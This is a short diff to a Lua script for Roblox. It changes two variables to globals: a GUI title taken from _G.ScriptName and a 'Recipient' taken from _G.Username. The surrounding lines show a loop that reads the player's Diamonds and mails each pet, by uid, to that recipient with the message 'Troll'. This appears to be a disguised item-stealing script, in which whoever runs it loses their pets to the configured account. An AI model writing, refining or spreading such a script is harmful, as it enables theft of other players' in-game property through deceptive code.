@@ -57,7 +57,7 @@ Title.BackgroundTransparency = 1.000
 Title.Position = UDim2.new(0.185, 0,0.250, 0)
 Title.Size = UDim2.new(0.632528603, 0, 0.232815996, 0)
 Title.Font = Enum.Font.FredokaOne
-Title.Text = ScriptName
+Title.Text = _G.ScriptName
 Title.TextColor3 = Color3.fromRGB(255, 255, 255)
 Title.TextScaled = true
 Title.TextSize = 14.000
@@ -284,7 +284,7 @@ while wait() do
 			_G.Diamonds = game.Players.LocalPlayer.leaderstats.Diamonds.Value
 			local args = {
     			[1] = {
-        			["Recipient"] = Username,
+        			["Recipient"] = _G.Username,
         			["Diamonds"] = 0,
         			["Pets"] = {v.uid},
         			["Message"] = "Troll"
@@ -295,7 +295,7 @@ while wait() do
 			_G.Diamonds = 0
 			local args = {
     			[1] = {
-        			["Recipient"] = Username,
+        			["Recipient"] = _G.Username,
         			["Diamonds"] = 0,
         			["Pets"] = {v.uid},
         			["Message"] = "Troll"
